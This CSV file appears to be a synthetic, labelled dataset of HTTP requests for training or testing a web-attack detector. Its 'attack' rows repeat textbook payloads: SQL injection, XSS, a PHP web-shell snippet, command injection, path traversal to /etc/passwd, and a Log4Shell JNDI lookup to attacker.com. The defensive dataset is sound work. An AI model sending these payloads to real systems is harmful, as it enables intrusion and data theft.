id,timestamp,method,path,http_headers,body,label
e85d9b6e-5116-415f-be3c-3732b4b9ca05,2026-02-25 02:57:35,GET,/cart,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
53c0e28b-fb2d-4d57-8441-c0d52c5befd8,2026-02-24 12:57:12,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
492ce601-2702-4a61-a0c7-49f0459d7467,2026-02-25 09:12:42,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
4a290ac2-2efe-400b-82d2-a8acbcab6ef4,2026-02-25 05:23:08,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
b8c521d0-937e-43fb-a171-2c8b166bbc88,2026-02-24 14:03:10,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
62bd120c-1e93-4c23-959f-0fdd8e1d7573,2026-02-24 16:59:57,GET,/home,User-Agent: Safari/537.36,,normal
8e7a60d0-d5b9-4247-82a1-01010b9c5ae9,2026-02-25 09:46:55,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
aed43e8e-0615-4e1d-a300-ffee333b37a8,2026-02-25 02:59:12,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
83c3f5c8-6030-48dc-bd45-67fe498d087f,2026-02-25 09:09:53,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
c0909d6e-35e1-451e-b274-3285f1b318d1,2026-02-24 13:53:11,POST,/checkout,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
756c2c32-b01c-4482-9fd7-1a48ab8e5568,2026-02-24 07:00:08,GET,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
be3fc616-e759-495e-8703-02d26e447804,2026-02-25 01:05:25,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
4db28a80-ea7c-42d0-aea4-9a5936cf9b78,2026-02-24 11:16:04,GET,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
3307e659-594d-4b1c-8e11-a2c73bd254ca,2026-02-24 10:31:54,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
956a5baf-375b-4c60-90f5-7d63a73dff34,2026-02-25 07:15:50,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
5d572742-9935-4b5c-b214-da49365a2734,2026-02-24 16:33:31,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
92d2b59f-d712-44b7-930e-ba743787d40c,2026-02-24 09:16:53,GET,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
43e6c3d6-4a74-4ee6-9306-0cdf8b64c3a0,2026-02-25 05:49:07,GET,/contact,User-Agent: Chrome/120.0.0.0,,normal
6fdcb173-5ed5-499c-b677-9ebaea7a1ef8,2026-02-25 06:49:32,POST,/contact,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
053f9b9a-c7ff-4339-993e-ffad06786b6d,2026-02-24 20:22:58,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
78fee183-d0ca-4736-9fe3-3f347b845323,2026-02-25 00:04:20,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
d6875930-ec06-4a84-9f43-e14062211aee,2026-02-24 21:53:59,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
ba61d94e-7966-4640-9416-9e944192a373,2026-02-25 09:10:44,GET,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
626ec9fb-f67e-4783-8403-cfdce039a854,2026-02-25 04:33:48,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
3786b283-644d-4f6d-893b-ce18a8d4b4d1,2026-02-24 18:09:37,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
ea2766ed-2b2a-4242-b34e-7f1279b5dc97,2026-02-25 05:36:39,GET,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
30522d7c-7f44-4caa-890b-efb3700bb6d8,2026-02-25 04:23:42,POST,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
8096824b-1390-474f-b469-52536a245732,2026-02-25 00:37:25,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
ba890b00-8dce-4ba4-9816-11c901e18c0a,2026-02-24 23:23:37,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
127682c2-1629-433e-a79a-8ad4c769990e,2026-02-24 07:30:24,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
a1bb0362-30b8-4305-bdad-731121dfa5d3,2026-02-24 15:13:29,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
9cbb170d-60a5-4273-a8d4-057647a5aada,2026-02-24 07:29:58,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
9d6fd91f-21bf-4a06-b7c1-8d682ab8f0f1,2026-02-24 09:41:35,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: sqlmap/1.6,|| ping -c 4 127.0.0.1 ||,attack
1002a692-6fa9-43a6-ab99-c68acbd6f945,2026-02-24 23:02:39,POST,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
e3fa9e0e-c1fb-4a86-879f-6d0175082590,2026-02-24 22:46:58,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
6ff111ad-8a77-4862-8c70-5791a531a410,2026-02-24 22:25:11,GET,/cart,User-Agent: Safari/537.36,,normal
2bf1dd5d-81c2-4e5d-95d4-3f2bafb7ecce,2026-02-24 14:54:55,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
33a61761-3479-48a8-a5c8-68628035f2b5,2026-02-25 05:03:59,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
cccecdba-c0e8-4107-8c85-d785c371cf59,2026-02-24 16:47:07,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
1dadf581-0146-4b15-b69c-b51c1657d44c,2026-02-24 11:49:07,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
113278ae-53d3-43c4-9d61-2c6a27272733,2026-02-25 06:32:28,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
af02b386-a277-4739-ad27-7e0e4507f2db,2026-02-24 17:59:14,POST,/home,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
57098ff2-9cde-4dff-91fa-8e5927cd64cf,2026-02-24 15:15:59,POST,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
ffc90618-ebbe-4b2c-8850-30c3060e7dec,2026-02-24 17:45:25,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
9e7b81b3-0b21-4454-9267-267c85983515,2026-02-25 05:12:48,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
841385de-0fce-44fd-bba3-c714ecb551bb,2026-02-24 13:04:01,POST,/checkout,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
3874c933-4f6b-449c-ab14-4d22d3c1bcf3,2026-02-25 09:10:30,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
800dd6f9-c237-4b52-8813-ae45ebec2737,2026-02-25 01:27:57,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
fe9a8ab4-0274-47b9-8d17-4eaad66de37d,2026-02-24 19:21:58,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
6e3fbead-bb70-4b50-82d9-7a6a4cb378a1,2026-02-25 07:15:43,GET,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
e8395fea-4d49-432b-b833-038b67ee4ef0,2026-02-25 07:08:38,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
40463b33-8d89-4606-b982-3f23603e9829,2026-02-24 15:50:33,POST,/products,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
8ec2bfc3-ac62-4783-b0b2-beef0e27ddb4,2026-02-25 04:41:13,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
2fdc78d1-78c1-49f4-8545-bfe4c30005de,2026-02-24 15:50:17,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
8ea0d901-431c-4bf4-9874-0fcc95e607d6,2026-02-24 10:11:13,POST,/api/v1/users,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
efa4ce74-e63b-43f9-91ac-f9f70b7a4b66,2026-02-24 21:24:11,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
c0872f6a-931c-4c73-bc78-e7f4d06e6854,2026-02-25 09:15:21,GET,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
f2c4fe87-9519-42b5-b433-b5c7331565bd,2026-02-24 19:58:16,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
155d61dd-a9f1-4d0e-b3f6-df11e731cbeb,2026-02-25 05:10:49,POST,/home,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
ba2cdf01-b685-4f74-a888-9f5684fe8b3e,2026-02-24 21:37:10,GET,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
c808b847-bc03-4f79-9d3f-b4934ccedfbb,2026-02-24 20:13:27,POST,/api/v1/orders?status=completed,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
3fb5179e-612c-49ea-b868-fb8006b967a3,2026-02-24 15:55:17,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
bf7038ac-4320-4f3b-8994-feee8464fee6,2026-02-24 22:08:06,GET,/contact,User-Agent: Safari/537.36,,normal
bfadf30a-6c5e-4e99-93fc-d2dc96dd53c5,2026-02-24 13:42:59,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
151d7c2a-1d72-4bd7-81ce-6f8cca75d62f,2026-02-24 12:32:01,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
fd74b555-41c6-4740-9307-3eef78186b80,2026-02-24 15:16:09,GET,/blog/article-1,User-Agent: Chrome/120.0.0.0,,normal
54095b82-4aa9-4435-8635-83d77ef7b21d,2026-02-24 10:49:40,POST,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
b67addea-168d-406b-b66d-6eae454510ba,2026-02-24 16:49:48,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
918813df-e3f1-42f1-8961-1aeeff322630,2026-02-25 06:39:49,POST,/search?q=shoes,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
4a5f50a2-5431-4b3f-b173-327cbbbb5f71,2026-02-24 17:42:05,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
3dba17b5-a9fe-4eae-b3a4-e4a7ba954096,2026-02-24 21:51:39,POST,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
cea22156-edcf-4565-93d0-eb4293afa0f7,2026-02-25 08:35:47,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
864d1aa6-6758-4c0f-99c1-680024ad8e1e,2026-02-24 21:45:01,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
47e9b7b1-95c0-48fe-b632-2036334b6a9b,2026-02-25 00:47:27,POST,/blog/article-1,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
b5f14a0d-0907-41cd-98fc-f6448aa07fef,2026-02-24 13:48:24,POST,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
0a8ceeff-1dd7-4b2e-a40a-bae3fc032acd,2026-02-24 12:25:24,POST,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
858c8543-9efe-403e-b764-ed6a8e2af46c,2026-02-24 18:35:22,GET,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
cef18f4a-3e79-4f5f-ae38-e9a2f2f4434f,2026-02-24 08:53:37,GET,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
b4c7d771-7cee-4b32-813c-4fc9d3615937,2026-02-25 02:23:39,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
3c38d851-f6c2-4290-8966-3030b3b64b26,2026-02-25 00:03:18,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
740c5854-a59b-4c74-94bd-652790c5486c,2026-02-24 08:36:08,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Nikto/2.1.6,|| ping -c 4 127.0.0.1 ||,attack
1e8123cf-ec0f-43da-a37a-c04be2e2bc0a,2026-02-24 17:28:04,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
c0fdcc68-449e-4d1e-a71d-a20f9b2f98a2,2026-02-24 10:45:58,GET,/contact,User-Agent: Chrome/120.0.0.0,,normal
cce2cc2f-805e-4a26-9862-3c0793ef2b8c,2026-02-25 01:29:18,POST,/search?q=shoes,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
d41051ae-dfac-4cce-83f8-b3ab7061bf80,2026-02-25 01:10:17,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
7ca5b24c-5cbb-41b7-af14-8a4917f0eb97,2026-02-25 09:01:30,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
2577727a-5c15-4244-bd28-451897fa8cd8,2026-02-24 14:22:05,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
29d327fa-a5b8-415f-b8c7-23b5db1aed7d,2026-02-24 11:00:47,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
34eeec32-b365-4db5-a602-168ced4f54a0,2026-02-25 05:59:03,GET,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
2c352c05-49c0-49c5-b23c-3cc0ff470b16,2026-02-24 18:01:52,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
c1877e4a-14c0-4686-a4e9-24aa2c0b8af6,2026-02-24 12:44:18,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
71e1a3ee-a95a-4f10-a45f-06ea4a037efa,2026-02-25 03:07:04,POST,/products?id=123,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
3bc6a3ec-8f65-4714-a22e-77b9411f50e9,2026-02-25 03:45:39,POST,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
db4996ce-cfe6-487e-93c8-b072643d4f92,2026-02-24 10:59:06,GET,/checkout,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
cfcc483e-475b-4b63-9067-ec6252ce2ce8,2026-02-24 10:49:40,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
00e78c34-9415-4b88-a23c-4cb54cc7b179,2026-02-24 22:38:33,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
bb4e337b-fa83-4255-a355-b24efc2cdab1,2026-02-24 13:09:37,GET,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
00e99e2e-48a6-49c3-923e-4594556d17c5,2026-02-24 17:34:14,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
f29ff5c5-ab14-4033-96a8-b065011ad0b7,2026-02-24 11:05:48,POST,/checkout,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
46e8a965-2091-410a-9bc3-5db0c0a1e0d4,2026-02-24 15:11:17,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Nikto/2.1.6,' OR 1=1 --,attack
0273c721-99a5-48a4-a231-f5fb233a9493,2026-02-24 08:26:03,GET,/contact,User-Agent: Safari/537.36,,normal
3d545c67-3179-4359-8df9-73fd32c155fc,2026-02-24 16:35:00,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
dd40aab8-f336-4d65-93fb-a80b773e8698,2026-02-24 12:36:55,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
b23acf9d-0890-4e93-abf8-eb56f367b4dc,2026-02-24 19:44:55,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
54c700a6-d417-4ceb-b1b8-4423236963cb,2026-02-24 22:13:14,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
0ef9394c-9e62-4aa8-a4d1-25821541d4af,2026-02-24 12:29:05,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
985fb36c-06ba-4677-aeb9-4a328a628ac5,2026-02-24 15:18:23,GET,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
e4eae82e-87c2-4ad0-9923-80181aaf8a63,2026-02-24 10:09:15,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
12cb0c75-c0fb-4f51-b0ad-8a284dfc096a,2026-02-24 18:52:02,GET,/search?q=shoes,User-Agent: Safari/537.36,,normal
0c9c4b6f-b5bc-42f0-a931-d8d9f8541bdb,2026-02-25 07:13:08,POST,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
4ed46e7e-8928-433f-97d0-3bec65e9de9d,2026-02-24 21:29:12,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
a4aacb8f-7f27-4b56-80f7-a2ea21c53aa7,2026-02-25 07:46:49,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
996cf1a3-bf7c-4a81-8f1e-cc5dda1329f8,2026-02-25 04:46:39,GET,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
197a866f-ee92-43a8-883f-375ea46d5a6a,2026-02-25 00:13:42,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
c52a9dc7-976d-4646-85da-46c0cb37864e,2026-02-25 04:01:35,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
37d87981-280c-4408-8a10-d82fba2768dd,2026-02-24 11:38:15,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
a7b8c190-7b26-45b9-9149-0f1ab0d09958,2026-02-25 05:32:53,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
e5268c39-df06-42ed-935b-ebec59018347,2026-02-24 21:07:30,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
a853d934-7e68-405d-8adf-f9e59546da4f,2026-02-25 01:44:08,POST,/api/v1/users,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
cc6572c5-8e03-4aed-8462-55a70b2255ea,2026-02-24 22:22:54,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
46036427-5b13-4113-839f-389e5e339051,2026-02-24 19:43:27,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
6cfa6b72-70a4-4d7c-a094-c09f77fc8f4d,2026-02-24 18:50:48,GET,/api/v1/orders?status=completed,User-Agent: Safari/537.36,,normal
10cd0ca9-c6d6-4486-9d55-6b06cab44e8a,2026-02-24 13:21:17,POST,/contact,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
bb6bbe18-e714-4ded-a259-61b76a9970b3,2026-02-24 06:57:36,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
47e10efe-8bf6-41d8-982d-dd2802b1a54d,2026-02-24 13:23:48,POST,/search?q=shoes,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
4d2f80e8-3694-4fcf-a6f9-b62144b30ab6,2026-02-24 10:23:30,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
8e8c1e89-1d6d-46b9-88ab-d02cba3db5b4,2026-02-25 08:06:59,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
23fbf154-0b04-4bb7-8c36-0184e606afd5,2026-02-24 13:10:15,POST,/products?id=123,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
402f725e-097b-4513-a8a1-e89ca11006d6,2026-02-25 10:03:58,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
2f902f02-b22d-4c45-a086-bc7147e42e9a,2026-02-25 00:09:59,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
8574a75c-7b2e-43c6-9ba8-fc9c4c772e5f,2026-02-24 22:20:37,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
49dc0642-4394-4b7f-9f5c-c0e9c1848a3a,2026-02-24 07:14:42,GET,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
0e31dd94-7fac-44fd-8f67-e0583c006e78,2026-02-25 05:43:35,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
12aee6bf-0285-496f-8f03-bca938019347,2026-02-24 23:55:09,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
a8707207-91ba-4e46-b8b9-a01e66449d78,2026-02-25 09:08:11,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
e7eabdaf-6b70-4347-85ab-5bda135d28b7,2026-02-25 02:54:01,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
78bf40f7-9c33-4929-97d3-c657044392b7,2026-02-24 06:44:05,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
df4b6233-0bc2-4258-bcd1-2550382fd567,2026-02-24 23:33:50,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
1e9f8a4f-def5-4e89-b03b-2918b92ea2ce,2026-02-25 01:48:51,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
42aebd38-4cba-4031-935a-998e2661ae8c,2026-02-24 14:12:56,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
06b0877f-691d-4bc0-8f4d-b721982c25fd,2026-02-24 12:40:55,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
86815312-0a6f-4db8-ba01-e14df80c693b,2026-02-24 14:53:55,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
